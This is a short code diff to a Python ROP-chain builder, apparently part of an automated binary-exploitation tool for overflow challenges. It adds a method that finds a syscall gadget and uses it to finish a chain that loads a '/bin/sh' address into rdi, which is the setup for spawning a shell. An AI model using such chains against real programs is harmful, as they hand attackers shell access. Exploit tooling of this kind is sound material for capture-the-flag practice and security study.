@@ -33,7 +33,7 @@ class ROP:
         payload += self.fill_reg("rdi", self.analysis.get_binsh())
         payload += self.fill_reg("rsi", 0)
         payload += self.fill_reg("rdx", 0)
-        payload += p64(0x4007d0)
+        payload += p64(self.get_syscall())
         
         return payload
     
@@ -58,9 +58,6 @@ class ROP:
         for i in sorted(raw_gadgets.communicate()[0].decode("utf-8").split("\n"), key=len):
             self.gadgets.append(i.replace(" nop;", ""))
 
-    def get_gadgets(self):
-        return self.gadgets
-
     def get_pops(self):
         pops = []
         for i in self.gadgets:
@@ -84,6 +81,11 @@ class ROP:
 
         return chain
 
+    def get_syscall(self):
+        for i in self.gadgets:
+            if "syscall" in i:
+                return int(i.split(":")[0], 16)
+        return None
 
 
 class Get2overflow:
